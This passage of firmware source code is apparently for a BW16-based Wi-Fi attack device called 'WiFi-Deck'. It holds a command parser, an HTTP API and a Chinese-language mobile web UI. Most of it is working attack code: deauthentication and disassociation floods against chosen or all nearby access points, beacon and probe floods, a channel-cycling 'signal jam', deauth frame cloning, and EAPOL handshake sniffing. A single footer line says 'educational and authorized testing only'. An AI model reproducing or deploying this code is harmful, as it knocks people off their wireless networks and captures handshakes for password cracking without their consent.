    else if (c == '\t') out += "\\t";
    else if (c >= 0 && c < 32) {
      char buf[8];
      snprintf(buf, sizeof(buf), "\\u%04x", c);
      out += buf;
    } else {
      out += c;
    }
  }
  return out;
}

String getScanResultsJSON() {
  String json = "{\"count\":" + String(scan_results.size()) + ",\"networks\":[";
  for (size_t i = 0; i < scan_results.size(); i++) {
    if (i) json += ",";
    json += "{";
    json += "\"index\":" + String(i) + ",";
    json += "\"ssid\":\"" + jsonEscape(scan_results[i].ssid) + "\",";
    json += "\"bssid\":\"" + scan_results[i].bssid_str + "\",";
    json += "\"channel\":" + String(scan_results[i].channel) + ",";
    json += "\"rssi\":" + String(scan_results[i].rssi) + ",";
    json += "\"band\":\"" + String((scan_results[i].channel >= 36) ? "5GHz" : "2.4GHz") + "\",";
    json += "\"selected\":" + String(scan_results[i].selected ? "true" : "false");
    json += "}";
  }
  json += "]}";
  return json;
}

String getStatusJSON() {
  String json = "{";
  json += "\"attack_enabled\":" + String(attack_enabled ? "true" : "false") + ",";
  json += "\"disassoc_enabled\":" + String(disassoc_enabled ? "true" : "false") + ",";
  json += "\"timed_attack\":" + String(timedAttackEnabled ? "true" : "false") + ",";
  json += "\"sniffing\":" + String(isSniffing ? "true" : "false") + ",";
  json += "\"hopping\":" + String(isHopping ? "true" : "false") + ",";
  json += "\"target_mode\":" + String(target_mode ? "true" : "false") + ",";
  json += "\"scan_count\":" + String(scan_results.size()) + ",";
  json += "\"target_count\":" + String(target_aps.size()) + ",";
  json += "\"current_channel\":" + String(currentChannel) + ",";
  json += "\"beacon_flood\":" + String(beacon_flood_enabled ? "true" : "false") + ",";
  json += "\"probe_flood\":" + String(probe_flood_enabled ? "true" : "false") + ",";
  json += "\"signal_jam\":" + String(signal_jam_enabled ? "true" : "false") + ",";
  json += "\"deauth_sniff\":" + String(deauth_sniff_enabled ? "true" : "false") + ",";
  json += "\"tx_ok\":" + String(tx_success_count) + ",";
  json += "\"tx_fail\":" + String(tx_fail_count) + ",";
  if (timedAttackEnabled) {
    unsigned long remaining = (attackDuration > (millis() - attackStartTime))
      ? (attackDuration - (millis() - attackStartTime)) : 0;
    json += "\"timed_remaining\":" + String(remaining) + ",";
  }
  json += "\"uptime\":" + String(millis());
  json += "}";
  return json;
}

String getInfoJSON() {
  String json = "{";
  json += "\"cycle_delay\":" + String(cycle_delay) + ",";
  json += "\"scan_time\":" + String(scan_time) + ",";
  json += "\"num_frames\":" + String(num_send_frames) + ",";
  json += "\"start_channel\":" + String(start_channel) + ",";
  json += "\"scan_between_cycles\":" + String(scan_between_cycles ? "true" : "false") + ",";
  json += "\"led\":" + String(USE_LED ? "true" : "false") + ",";
  json += "\"ssid\":\"" + jsonEscape(String(WIFI_SSID)) + "\",";
  json += "\"channel\":" + String(WIFI_CHANNEL);
  json += "}";
  return json;
}

//==========================================================
// HTTP Helpers
//==========================================================
String httpHeader(int code, const String &contentType, int contentLength = -1) {
  String reason = (code == 200) ? "OK" : (code == 400) ? "Bad Request" : (code == 404) ? "Not Found" : "OK";
  String h = "HTTP/1.1 " + String(code) + " " + reason + "\r\n";
  h += "Content-Type: " + contentType + "\r\n";
  h += "Access-Control-Allow-Origin: *\r\n";
  if (contentLength >= 0) {
    h += "Content-Length: " + String(contentLength) + "\r\n";
  }
  h += "Connection: close\r\n\r\n";
  return h;
}

void sendLargeText(WiFiClient &client, const char *data, size_t totalLen) {
  const size_t CHUNK_SIZE = 1024;
  size_t sent = 0;
  while (sent < totalLen && client.connected()) {
    size_t toSend = (totalLen - sent > CHUNK_SIZE) ? CHUNK_SIZE : (totalLen - sent);
    client.write((const uint8_t *)data + sent, toSend);
    sent += toSend;
    delay(2);  // give lwIP time to drain its send window
  }
}

String parsePath(const String &request) {
  int start = request.indexOf(' ');
  if (start < 0) return "/";
  start++;
  int end = request.indexOf(' ', start);
  if (end < 0) return "/";
  return request.substring(start, end);
}

String parseMethod(const String &request) {
  int end = request.indexOf(' ');
  if (end < 0) return "GET";
  return request.substring(0, end);
}

String parseBody(const String &request) {
  int idx = request.indexOf("\r\n\r\n");
  if (idx < 0) return "";
  return request.substring(idx + 4);
}

String urlDecode(const String &s) {
  String out = "";
  for (size_t i = 0; i < s.length(); i++) {
    char c = s[i];
    if (c == '+') out += ' ';
    else if (c == '%' && i + 2 < s.length()) {
      char hex[3] = {s[i+1], s[i+2], 0};
      out += (char)strtol(hex, nullptr, 16);
      i += 2;
    } else {
      out += c;
    }
  }
  return out;
}

String getQueryParam(const String &path, const String &key) {
  int q = path.indexOf('?');
  if (q < 0) return "";
  String query = path.substring(q + 1);
  String prefix = key + "=";
  int start = -1;
  for (int from = 0; from < (int)query.length(); ) {
    int pos = query.indexOf(prefix, from);
    if (pos < 0) break;
    // Accept the key only at the start or right after a '&', so that e.g.
    // "led" does not match inside "use_led".
    if (pos == 0 || query.charAt(pos - 1) == '&') {
      start = pos;
      break;
    }
    from = pos + 1;
  }
  if (start < 0) return "";
  start += prefix.length();
  int end = query.indexOf('&', start);
  if (end < 0) end = query.length();
  return urlDecode(query.substring(start, end));
}

String getPostValue(const String &body, const String &key) {
  String prefix = key + "=";
  int start = -1;
  for (int from = 0; from < (int)body.length(); ) {
    int pos = body.indexOf(prefix, from);
    if (pos < 0) break;
    if (pos == 0 || body.charAt(pos - 1) == '&') {
      start = pos;
      break;
    }
    from = pos + 1;
  }
  if (start < 0) return "";
  start += prefix.length();
  int end = body.indexOf('&', start);
  if (end < 0) end = body.length();
  return urlDecode(body.substring(start, end));
}

//==========================================================
// Handle Incoming Commands
//==========================================================
void handleCommand(String command) {
  command.trim();

  if (command.equalsIgnoreCase("start deauther")) {
    attack_enabled = true;
    Serial.println("[INFO] Deauthentication Attack started.");
  }
  else if (command.equalsIgnoreCase("stop deauther") || command.equalsIgnoreCase("stop") || command.equalsIgnoreCase("stop all")) {
    // Universal stop: kill every attack and restore the soft AP
    attack_enabled = false;
    disassoc_enabled = false;
    timedAttackEnabled = false;
    scan_enabled = false;
    beacon_flood_enabled = false;
    probe_flood_enabled = false;
    signal_jam_enabled = false;
    deauth_sniff_enabled = false;
    has_sniffed_deauth = false;
    if (isSniffing) { stopSniffing(); }  // restores AP via startSoftAP()
    wifi_set_channel(WIFI_CHANNEL);       // restore AP channel
    currentChannel = WIFI_CHANNEL;
    if (USE_LED) digitalWrite(LED_B, LOW);
    Serial.println("[INFO] All attacks stopped.");
  }
  else if (command.equalsIgnoreCase("scan")) {
    scan_enabled = true;
    Serial.println("[INFO] Starting scan...");
    if (scanNetworks() == 0) {
      printScanResults();
      scan_enabled = false;
      Serial.println("[INFO] Scan completed.");
    }
    else {
      Serial.println("[ERROR] Scan failed.");
    }
  }
  else if (command.equalsIgnoreCase("results")) {
    if (!scan_results.empty()) {
      printScanResults();
      blePushScanResults();
    }
    else {
      Serial.println("[INFO] No scan results available. Try 'scan' first.");
    }
  }
  else if (command.startsWith("attack_time ")) {
    String valStr = command.substring(String("attack_time ").length());
    unsigned long durationMs = valStr.toInt();
    if (durationMs > 0) {
      startTimedAttack(durationMs);
      Serial.println("[INFO] Timed attack started for " + String(durationMs) + " ms.");
    }
  }
  else if (command.equalsIgnoreCase("disassoc")) {
    if (!disassoc_enabled) {
      disassoc_enabled = true;
      Serial.println("[INFO] Continuous Disassociation Attack started.");
    }
  }
  else if (command.equalsIgnoreCase("random_attack")) {
    if (!scan_results.empty()) {
      size_t idx = random(0, scan_results.size());
      uint8_t randChannel = scan_results[idx].channel;
      if (wifi_set_channel(randChannel) != 0) {
        Serial.print("[WARN] wifi_set_channel(");
        Serial.print(randChannel);
        Serial.println(") failed");
      }
      for (unsigned long j = 0; j < num_send_frames; j++) {
        uint16_t reason = deauth_reasons[j % num_deauth_reasons];
        wifi_tx_deauth_frame(scan_results[idx].bssid, dst_mac, reason);
        wifi_tx_deauth_frame(scan_results[idx].bssid, scan_results[idx].bssid, disassoc_reasons[j % num_disassoc_reasons]);
        wifi_tx_disassoc_frame(scan_results[idx].bssid, dst_mac, disassoc_reasons[j % num_disassoc_reasons]);
        wifi_tx_disassoc_frame(scan_results[idx].bssid, scan_results[idx].bssid, disassoc_reasons[j % num_disassoc_reasons]);
        delay(1);
      }
      wifi_set_channel(WIFI_CHANNEL);
      Serial.print("[RANDOM ATTACK] => ");
      Serial.print(scan_results[idx].ssid);
      Serial.print(" on channel ");
      Serial.println(randChannel);
    }
  }
  //==========================
  // Flood / Jam / Sniff-clone attacks (merged from upstream v1.0.3)
  //==========================
  else if (command.equalsIgnoreCase("beacon_flood") || command.equalsIgnoreCase("beacon flood")) {
    if (beacon_flood_enabled) {
      beacon_flood_enabled = false;
      Serial.println("[INFO] Beacon flood stopped.");
    } else {
      if (isSniffing) { stopSniffing(); }
      beacon_flood_enabled = true;
      beacon_flood_count = 0;
      Serial.println("[INFO] Beacon flood started.");
    }
  }
  else if (command.equalsIgnoreCase("probe_flood") || command.equalsIgnoreCase("probe flood")) {
    if (probe_flood_enabled) {
      probe_flood_enabled = false;
      Serial.println("[INFO] Probe flood stopped.");
    } else {
      if (isSniffing) { stopSniffing(); }
      probe_flood_enabled = true;
      probe_flood_count = 0;
      Serial.println("[INFO] Probe flood started.");
    }
  }
  else if (command.equalsIgnoreCase("signal_jam") || command.equalsIgnoreCase("signal jam")) {
    if (signal_jam_enabled) {
      signal_jam_enabled = false;
      wifi_set_channel(WIFI_CHANNEL);
      currentChannel = WIFI_CHANNEL;
      if (USE_LED) digitalWrite(LED_B, LOW);
      Serial.println("[INFO] Signal jam stopped.");
    } else {
      if (isSniffing) { stopSniffing(); }
      signal_jam_enabled = true;
      signal_jam_count = 0;
      signal_jam_ch_index = 0;
      Serial.println("[INFO] Signal jam started - rapid channel cycling + deauth.");
    }
  }
  else if (command.equalsIgnoreCase("deauth_sniff") || command.equalsIgnoreCase("deauth sniff")) {
    if (deauth_sniff_enabled) {
      deauth_sniff_enabled = false;
      has_sniffed_deauth = false;
      stopSniffing();  // exit promisc, restore AP
      Serial.println("[INFO] Deauth sniff stopped.");
    } else {
      currentMode = SNIFF_DEAUTH;
      startSniffing();
      deauth_sniff_enabled = true;
      has_sniffed_deauth = false;
      Serial.println("[INFO] Deauth sniff started - listening for deauth frames to clone.");
    }
  }
  else if (command.startsWith("single_ap") || command.startsWith("single ap")) {
    if (scan_results.empty()) {
      Serial.println("[ERROR] No scan results. Run 'scan' first.");
    } else {
      String idxStr = command.substring(command.indexOf(' ') + 1);
      idxStr.trim();
      int idx = idxStr.toInt();
      if (idx < 0 || idx >= (int)scan_results.size()) idx = 0;
      if (isSniffing) { stopSniffing(); }
      wifi_set_channel(scan_results[idx].channel);
      for (unsigned long j = 0; j < num_send_frames; j++) {
        wifi_tx_deauth_frame(scan_results[idx].bssid, dst_mac, deauth_reasons[j % num_deauth_reasons]);
        wifi_tx_deauth_frame(scan_results[idx].bssid, scan_results[idx].bssid, disassoc_reasons[j % num_disassoc_reasons]);
        wifi_tx_disassoc_frame(scan_results[idx].bssid, dst_mac, disassoc_reasons[j % num_disassoc_reasons]);
        wifi_tx_disassoc_frame(scan_results[idx].bssid, scan_results[idx].bssid, disassoc_reasons[j % num_disassoc_reasons]);
        delay(1);
      }
      wifi_set_channel(WIFI_CHANNEL);
      Serial.print("[SINGLE AP] Attacked ");
      Serial.print(scan_results[idx].ssid);
      Serial.print(" on ch ");
      Serial.println(scan_results[idx].channel);
    }
  }
  else if (command.equalsIgnoreCase("tx_stats")) {
    Serial.println("TX Stats: " + String(tx_success_count) + " OK / " + String(tx_fail_count) + " FAIL");
  }
  else if (command.equalsIgnoreCase("reset_txstats")) {
    tx_success_count = 0;
    tx_fail_count = 0;
    seq_num_counter = 1;
    Serial.println("[TX STATS] Reset.");
  }
  else if (command == "start sniff") {
    currentMode = SNIFF_ALL;
    startSniffing();
  }
  else if (command == "hop on") {
    isHopping = true;
    if (!isSniffing) { wifi_on(RTW_MODE_PROMISC); wifi_enter_promisc_mode(); }
  }
  else if (command == "hop off") {
    isHopping = false;
  }
  else if (command.startsWith("set ch ")) {
    String chStr = command.substring(7);
    chStr.trim();
    int newChannel = chStr.toInt();
    bool validChannel = false;
    for (int ch : CHANNELS_2GHZ) { if (ch == newChannel) validChannel = true; }
    for (int ch : CHANNELS_5GHZ) { if (ch == newChannel) validChannel = true; }
    if (validChannel) {
      isHopping = false;
      useCustomChannels = false;
      setChannel(newChannel);
    }
  }
  else if (command == "sniff beacon") { currentMode = SNIFF_BEACON; startSniffing(); }
  else if (command == "sniff probe") { currentMode = SNIFF_PROBE; startSniffing(); }
  else if (command == "sniff deauth") { currentMode = SNIFF_DEAUTH; startSniffing(); }
  else if (command == "sniff eapol") { currentMode = SNIFF_EAPOL; startSniffing(); }
  else if (command == "sniff pwnagotchi") { currentMode = SNIFF_PWNAGOTCHI; startSniffing(); }
  else if (command == "sniff all") { currentMode = SNIFF_ALL; startSniffing(); }
  else if (command == "stop sniff") { stopSniffing(); }
  else if (command.startsWith("set ")) {
    String setting = command.substring(4);
    setting.trim();
    int space_index = setting.indexOf(' ');
    if (space_index != -1) {
      String key = setting.substring(0, space_index);
      String value = setting.substring(space_index + 1);
      value.replace(" ", "");

      if (key.equalsIgnoreCase("cycle_delay")) { cycle_delay = value.toInt(); blePushInfo(); }
      else if (key.equalsIgnoreCase("scan_time")) { scan_time = value.toInt(); blePushInfo(); }
      else if (key.equalsIgnoreCase("num_frames")) { num_send_frames = value.toInt(); blePushInfo(); }
      else if (key.equalsIgnoreCase("start_channel")) { start_channel = value.toInt(); blePushInfo(); }
      else if (key.equalsIgnoreCase("scan_cycles")) { scan_between_cycles = value.equalsIgnoreCase("on"); blePushInfo(); }
      else if (key.equalsIgnoreCase("led")) {
        USE_LED = value.equalsIgnoreCase("on");
        if (!USE_LED) {
          digitalWrite(LED_R, LOW);
          digitalWrite(LED_G, LOW);
          digitalWrite(LED_B, LOW);
        }
        blePushInfo();
      }
      else if (key.equalsIgnoreCase("target")) {
        target_aps.clear();
        target_mode = false;
        int start = 0;
        int end = 0;
        while ((end = value.indexOf(',', start)) != -1) {
          int target_index = value.substring(start, end).toInt();
          if (target_index >= 0 && target_index < (int)scan_results.size()) {
            target_aps.push_back(scan_results[target_index]);
          }
          start = end + 1;
        }
        if (start < (int)value.length()) {
          int target_index = value.substring(start).toInt();
          if (target_index >= 0 && target_index < (int)scan_results.size()) {
            target_aps.push_back(scan_results[target_index]);
          }
        }
        if (!target_aps.empty()) target_mode = true;
      }
    }
    else if (setting.equalsIgnoreCase("target")) {
      // "set target" with no value -> clear targets, fall back to full mode.
      target_aps.clear();
      target_mode = false;
    }
  }
  else if (command.equalsIgnoreCase("info")) {
    Serial.println("[INFO] cycle_delay=" + String(cycle_delay) + " scan_time=" + String(scan_time) + " frames=" + String(num_send_frames));
    blePushInfo();
  }
  else if (command.equalsIgnoreCase("help")) {
    Serial.println("Commands: scan, results, start deauther, stop, disassoc, random_attack, attack_time <ms>");
    Serial.println("Sniffer: start sniff, sniff beacon/probe/deauth/eapol/pwnagotchi/all, stop sniff, hop on/off");
    Serial.println("Config: set cycle_delay/scan_time/num_frames/start_channel/scan_cycles/led/target <val>");
    Serial.println("Web: connect to WiFi '" WIFI_SSID "' and open 192.168.1.1 in browser");
  }
  else {
    Serial.println("[ERROR] Unknown command: " + command);
  }
}

//==========================================================
// Attack Functions
//==========================================================
void targetAttack() {
  if (target_mode && attack_enabled) {
    if (USE_LED) digitalWrite(LED_B, HIGH);
    for (size_t i = 0; i < target_aps.size(); i++) {
      if (wifi_set_channel(target_aps[i].channel) != 0) {
        Serial.print("[WARN] wifi_set_channel(");
        Serial.print(target_aps[i].channel);
        Serial.println(") failed");
        continue;
      }
      for (unsigned long j = 0; j < num_send_frames; j++) {
        uint16_t reason = deauth_reasons[j % num_deauth_reasons];
        wifi_tx_deauth_frame(target_aps[i].bssid, dst_mac, reason);                                                     // broadcast deauth
        wifi_tx_deauth_frame(target_aps[i].bssid, target_aps[i].bssid, disassoc_reasons[j % num_disassoc_reasons]);      // directed deauth
        wifi_tx_disassoc_frame(target_aps[i].bssid, dst_mac, disassoc_reasons[j % num_disassoc_reasons]);                // broadcast disassoc
        wifi_tx_disassoc_frame(target_aps[i].bssid, target_aps[i].bssid, disassoc_reasons[j % num_disassoc_reasons]);    // directed disassoc
        delay(1);
      }
    }
    // Return to the AP's own channel so the phone keeps its connection.
    wifi_set_channel(WIFI_CHANNEL);
    if (USE_LED) digitalWrite(LED_B, LOW);
  }
}

void generalAttack() {
  if (!target_mode && attack_enabled) {
    attackCycle();
  }
}

void attackCycle() {
  uint8_t currentCh = 0xFF;
  if (USE_LED) digitalWrite(LED_B, HIGH);
  for (size_t i = 0; i < scan_results.size(); i++) {
    uint8_t targetChannel = scan_results[i].channel;
    if (targetChannel != currentCh) {
      if (wifi_set_channel(targetChannel) != 0) {
        Serial.print("[WARN] wifi_set_channel(");
        Serial.print(targetChannel);
        Serial.println(") failed");
        continue;
      }
      currentCh = targetChannel;
    }
    for (unsigned long j = 0; j < num_send_frames; j++) {
      uint16_t reason = deauth_reasons[j % num_deauth_reasons];
      wifi_tx_deauth_frame(scan_results[i].bssid, dst_mac, reason);                                                   // broadcast deauth
      wifi_tx_deauth_frame(scan_results[i].bssid, scan_results[i].bssid, disassoc_reasons[j % num_disassoc_reasons]);  // directed deauth
      wifi_tx_disassoc_frame(scan_results[i].bssid, dst_mac, disassoc_reasons[j % num_disassoc_reasons]);              // broadcast disassoc
      wifi_tx_disassoc_frame(scan_results[i].bssid, scan_results[i].bssid, disassoc_reasons[j % num_disassoc_reasons]);// directed disassoc
      delay(1);
    }
  }
  // Return to the AP's own channel so the phone keeps its connection.
  wifi_set_channel(WIFI_CHANNEL);
  if (USE_LED) digitalWrite(LED_B, LOW);
  Serial.println("Attack cycle completed.");
}

//==========================================================
// Web Client Handler
//==========================================================
void handleWebClient() {
  WiFiClient client = webServer.available();
  if (!client || !client.connected()) return;

  String request = "";
  unsigned long timeout = millis() + 3000;
  while (client.available() == 0 && millis() < timeout) {
    delay(1);
  }
  while (client.connected() && millis() < timeout) {
    while (client.available()) {
      char c = client.read();
      request += c;
      if (request.length() > 4096) break;
    }
    int headerEnd = request.indexOf("\r\n\r\n");
    if (headerEnd >= 0) {
      // GET is complete once the headers are in. For POST the body may arrive
      // in a later TCP packet, so wait briefly for it before giving up.
      if (request.startsWith("GET ") || request.length() > (size_t)(headerEnd + 4)) {
        break;
      }
      delay(20);
      while (client.available()) {
        char c = client.read();
        request += c;
        if (request.length() > 4096) break;
      }
      break;
    }
    if (request.length() > 4096) break;
    delay(1);
  }

  if (request.length() == 0) {
    client.stop();
    return;
  }

  String method = parseMethod(request);
  String fullPath = parsePath(request);
  String path = fullPath;
  int qIdx = path.indexOf('?');
  if (qIdx >= 0) path = path.substring(0, qIdx);

  Serial.println("[WEB] " + method + " " + fullPath);

  if (USE_LED) digitalWrite(LED_G, HIGH);

  if (path == "/api/scan" && method == "GET") {
    String json = getScanResultsJSON();
    client.write(httpHeader(200, "application/json", json.length()).c_str());
    client.write(json.c_str());
  }
  else if (path == "/api/scan" && method == "POST") {
    handleCommand("scan");
    String json = "{\"status\":\"scan_complete\",\"count\":" + String(scan_results.size()) + "}";
    client.write(httpHeader(200, "application/json", json.length()).c_str());
    client.write(json.c_str());
  }
  else if (path == "/api/status" && method == "GET") {
    String json = getStatusJSON();
    client.write(httpHeader(200, "application/json", json.length()).c_str());
    client.write(json.c_str());
  }
  else if (path == "/api/info" && method == "GET") {
    String json = getInfoJSON();
    client.write(httpHeader(200, "application/json", json.length()).c_str());
    client.write(json.c_str());
  }
  else if (path == "/api/command" && method == "POST") {
    String body = parseBody(request);
    String cmd = getPostValue(body, "cmd");
    cmd.trim();
    if (cmd.length() == 0) cmd = getQueryParam(fullPath, "cmd");
    if (cmd.length() > 0) {
      handleCommand(cmd);
      String json = "{\"status\":\"ok\",\"command\":\"" + jsonEscape(cmd) + "\"}";
      client.write(httpHeader(200, "application/json", json.length()).c_str());
      client.write(json.c_str());
    } else {
      String json = "{\"status\":\"error\",\"message\":\"No command provided\"}";
      client.write(httpHeader(400, "application/json", json.length()).c_str());
      client.write(json.c_str());
    }
  }
  else if (path == "/api/target" && method == "POST") {
    String indices = getQueryParam(fullPath, "indices");
    if (indices.length() == 0) {
      String body = parseBody(request);
      indices = getPostValue(body, "indices");
    }
    String cmd = "set target " + indices;
    handleCommand(cmd);
    String json = "{\"status\":\"ok\",\"targets\":" + String(target_aps.size()) + ",\"target_mode\":" + String(target_mode ? "true" : "false") + "}";
    client.write(httpHeader(200, "application/json", json.length()).c_str());
    client.write(json.c_str());
  }
  else if (path == "/api/config" && method == "POST") {
    String body = parseBody(request);
    String result = "";
    if (body.indexOf("cycle_delay=") >= 0) {
      handleCommand("set cycle_delay " + getPostValue(body, "cycle_delay"));
      result += "cycle_delay updated ";
    }
    if (body.indexOf("scan_time=") >= 0) {
      handleCommand("set scan_time " + getPostValue(body, "scan_time"));
      result += "scan_time updated ";
    }
    if (body.indexOf("num_frames=") >= 0) {
      handleCommand("set num_frames " + getPostValue(body, "num_frames"));
      result += "num_frames updated ";
    }
    if (body.indexOf("start_channel=") >= 0) {
      handleCommand("set start_channel " + getPostValue(body, "start_channel"));
      result += "start_channel updated ";
    }
    if (body.indexOf("led=") >= 0) {
      handleCommand("set led " + getPostValue(body, "led"));
      result += "led updated ";
    }
    if (body.indexOf("scan_cycles=") >= 0) {
      handleCommand("set scan_cycles " + getPostValue(body, "scan_cycles"));
      result += "scan_cycles updated ";
    }
    String json = "{\"status\":\"ok\",\"message\":\"" + jsonEscape(result) + "\"}";
    client.write(httpHeader(200, "application/json", json.length()).c_str());
    client.write(json.c_str());
  }
  else if (path == "/" && method == "GET") {
    client.write(httpHeader(200, "text/html", strlen(INDEX_HTML)).c_str());
    sendLargeText(client, INDEX_HTML, strlen(INDEX_HTML));
  }
  else {
    String msg = "404 Not Found";
    client.write(httpHeader(404, "text/plain", msg.length()).c_str());
    client.write(msg.c_str());
  }

  delay(10);
  client.stop();
  if (USE_LED) digitalWrite(LED_G, LOW);
}

//==========================================================
// HTML Page (Mobile-friendly Web UI)
//==========================================================
const char INDEX_HTML[] = R"=====(<!DOCTYPE html>
<html lang="zh">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<meta name="theme-color" content="#1a1a2e">
<title>WiFi-Deck</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{background:#1a1a2e;color:#e0e0e0;font-family:-apple-system,sans-serif;padding-bottom:60px}
.header{background:#16213e;padding:12px 16px;position:sticky;top:0;z-index:100;display:flex;justify-content:space-between;align-items:center;border-bottom:1px solid #0f3460}
.header h1{font-size:18px;font-weight:600}
.header .status-dot{width:10px;height:10px;border-radius:50%;background:#555;transition:.3s}
.header .status-dot.active{background:#e94560}
.header .status-dot.attacking{background:#ff4757;animation:pulse 1s infinite}
@keyframes pulse{0%,100%{opacity:1}50%{opacity:.3}}
.tabs{display:flex;background:#16213e;border-bottom:1px solid #0f3460}
.tab{flex:1;padding:12px 0;text-align:center;font-size:13px;color:#888;cursor:pointer;border-bottom:2px solid transparent;transition:.2s}
.tab.active{color:#e94560;border-color:#e94560}
.tab:active{background:#0f3460}
.page{display:none;padding:12px}
.page.active{display:block}
.btn{display:inline-block;width:100%;padding:12px;margin:4px 0;border:none;border-radius:8px;font-size:14px;font-weight:600;text-align:center;cursor:pointer;transition:.2s}
.btn:active{transform:scale(.97)}
.btn-primary{background:#e94560;color:#fff}
.btn-success{background:#2ecc71;color:#fff}
.btn-danger{background:#e74c3c;color:#fff}
.btn-warning{background:#f39c12;color:#000}
.btn-info{background:#3498db;color:#fff}
.btn-dark{background:#2c3e50;color:#fff}
.btn:disabled{opacity:.4;cursor:not-allowed;transform:none}
.net-item{background:#16213e;border-radius:8px;padding:10px 12px;margin:6px 0;display:flex;align-items:center;cursor:pointer;border:1px solid transparent;transition:.2s}
.net-item:active{background:#0f3460}
.net-item.selected{border-color:#e94560;background:#1a1a3e}
.net-info{flex:1}
.net-ssid{font-size:14px;font-weight:600;margin-bottom:2px;word-break:break-all}
.net-meta{font-size:11px;color:#888}
.net-band{font-size:10px;padding:2px 6px;border-radius:4px;margin-left:6px}
.net-band.band5{background:#e94560;color:#fff}
.net-band.band24{background:#3498db;color:#fff}
.net-check{width:24px;height:24px;border:2px solid #555;border-radius:6px;display:flex;align-items:center;justify-content:center;margin-left:8px;transition:.2s}
.net-item.selected .net-check{background:#e94560;border-color:#e94560}
.net-item.selected .net-check::after{content:'✓';color:#fff;font-size:14px}
.bar{width:100%;height:8px;background:#2c3e50;border-radius:4px;overflow:hidden;margin-top:4px}
.bar-fill{height:100%;border-radius:4px;transition:.3s}
.bar-fill.good{background:#2ecc71}
.bar-fill.mid{background:#f39c12}
.bar-fill.bad{background:#e74c3c}
.stats{display:grid;grid-template-columns:1fr 1fr;gap:8px;margin:8px 0}
.stat-card{background:#16213e;border-radius:8px;padding:10px;text-align:center}
.stat-val{font-size:20px;font-weight:700;color:#e94560}
.stat-label{font-size:11px;color:#888;margin-top:2px}
.config-row{display:flex;justify-content:space-between;align-items:center;padding:8px 12px;background:#16213e;border-radius:8px;margin:4px 0}
.config-label{font-size:13px;color:#aaa}
.config-input{width:80px;padding:6px 8px;background:#0f3460;border:1px solid #1a1a4e;border-radius:6px;color:#fff;font-size:13px;text-align:right}
.loading{display:none;text-align:center;padding:20px;color:#888;font-size:13px}
.loading.show{display:block}
.toast{position:fixed;bottom:70px;left:50%;transform:translateX(-50%);background:#16213e;color:#e94560;padding:10px 20px;border-radius:8px;font-size:13px;z-index:200;opacity:0;transition:.3s;pointer-events:none;border:1px solid #e94560}
.toast.show{opacity:1}
.footer{text-align:center;padding:8px;font-size:11px;color:#444}
</style>
</head>
<body>
<div class="header">
<h1>⚡ WiFi-Deck</h1>
<div class="status-dot" id="statusDot"></div>
</div>
<div class="tabs">
<div class="tab active" onclick="showPage('scan')">📡 扫描</div>
<div class="tab" onclick="showPage('attack')">⚔️ 攻击</div>
<div class="tab" onclick="showPage('config')">⚙️ 设置</div>
</div>
<div class="page active" id="page-scan">
<button class="btn btn-info" onclick="doScan()">🔄 扫描 WiFi</button>
<div class="loading" id="scanLoading">扫描中... (约5秒)</div>
<div id="netList"></div>
</div>
<div class="page" id="page-attack">
<div class="stats">
<div class="stat-card"><div class="stat-val" id="statTargets">0</div><div class="stat-label">已选目标</div></div>
<div class="stat-card"><div class="stat-val" id="statNets">0</div><div class="stat-label">网络总数</div></div>
</div>
<button class="btn btn-primary" onclick="startAttack('start deauther')">▶️ 开始 Deauth</button>
<button class="btn btn-warning" onclick="startAttack('disassoc')">▶️ 开始 Disassoc</button>
<button class="btn btn-dark" onclick="sendCmd('random_attack')">🎲 随机攻击</button>
<button class="btn btn-info" onclick="timedAttack()">⏱️ 定时攻击</button>
<hr style="border:0;border-top:1px solid #0f3460;margin:8px 0">
<button class="btn btn-success" onclick="sendCmd('stop')">⏹️ 停止所有攻击</button>
<hr style="border:0;border-top:1px solid #0f3460;margin:8px 0">
<button class="btn btn-dark" onclick="sendCmd('beacon_flood')">📶 Beacon Flood</button>
<button class="btn btn-dark" onclick="sendCmd('probe_flood')">📡 Probe Flood</button>
<button class="btn btn-dark" onclick="sendCmd('signal_jam')">📳 Signal Jam</button>
<button class="btn btn-dark" onclick="sendCmd('deauth_sniff')">🎯 Deauth 嗅探克隆</button>
<button class="btn btn-dark" onclick="singleApAttack()">🎯 单AP攻击</button>
<hr style="border:0;border-top:1px solid #0f3460;margin:8px 0">
<button class="btn btn-dark" onclick="sendCmd('start sniff')">👁️ 开始嗅探(ALL)</button>
<button class="btn btn-dark" onclick="sendCmd('sniff deauth')">👁️ 嗅探 Deauth</button>
<button class="btn btn-dark" onclick="sendCmd('sniff eapol')">👁️ 嗅探 EAPOL</button>
<button class="btn btn-dark" onclick="sendCmd('stop sniff')">🛑 停止嗅探</button>
<button class="btn btn-dark" onclick="sendCmd('hop on')">📺 信道跳频开</button>
<button class="btn btn-dark" onclick="sendCmd('hop off')">📺 信道跳频关</button>
</div>
<div class="page" id="page-config">
<div class="config-row"><span class="config-label">攻击间隔 (ms)</span><input class="config-input" type="number" id="cfgCycleDelay" value="2000"></div>
<div class="config-row"><span class="config-label">扫描时间 (ms)</span><input class="config-input" type="number" id="cfgScanTime" value="5000"></div>
<div class="config-row"><span class="config-label">每AP帧数</span><input class="config-input" type="number" id="cfgNumFrames" value="3"></div>
<div class="config-row"><span class="config-label">起始信道</span><input class="config-input" type="number" id="cfgStartChannel" value="1"></div>
<div class="config-row"><span class="config-label">循环间扫描</span><select class="config-input" id="cfgScanCycles"><option value="off">关</option><option value="on">开</option></select></div>
<div class="config-row"><span class="config-label">LED 指示</span><select class="config-input" id="cfgLed"><option value="on">开</option><option value="off">关</option></select></div>
<button class="btn btn-primary" onclick="saveConfig()">💾 保存配置</button>
<hr style="border:0;border-top:1px solid #0f3460;margin:8px 0">
<div class="stat-card"><div class="stat-val" id="cfgUptime">--</div><div class="stat-label">运行时间</div></div>
<div class="footer">WiFi-Deck | Based on 7h30th3r0n3/Evil-BW16<br>⚠️ For educational and authorized testing only</div>
</div>
<div class="toast" id="toast"></div>
<script>
const API='/api';
let selectedIndices=new Set();let scanCache=null;
function showPage(p){document.querySelectorAll('.tab').forEach((t,i)=>t.classList.toggle('active',['scan','attack','config'][i]===p));document.querySelectorAll('.page').forEach(pg=>pg.classList.remove('active'));document.getElementById('page-'+p).classList.add('active');if(p==='attack')updateAttackStats();}
